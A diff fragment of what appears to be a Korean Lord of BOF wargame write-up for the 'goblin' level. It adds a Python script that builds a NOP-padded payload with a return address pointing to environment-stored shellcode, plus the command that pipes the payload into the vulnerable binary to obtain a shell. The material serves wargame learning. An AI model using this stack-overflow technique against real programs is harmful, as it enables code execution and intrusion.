@@ -98,3 +98,27 @@ Cobolt 문제에서 BoF 취약점이 존재했던 strcpy함수 외에도 gets함
 
 -----
 
+```python
+#ex.py
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/cobolt/goblin"
+
+shellcode_env_addr = 0xbffffc33
+
+payload = "\x90"*20
+payload = append(p32(shellcode_env_addr))
+
+print payload
+```
+
+```
+(python ex.py;cat)|./goblin
+```
+
+-----
+
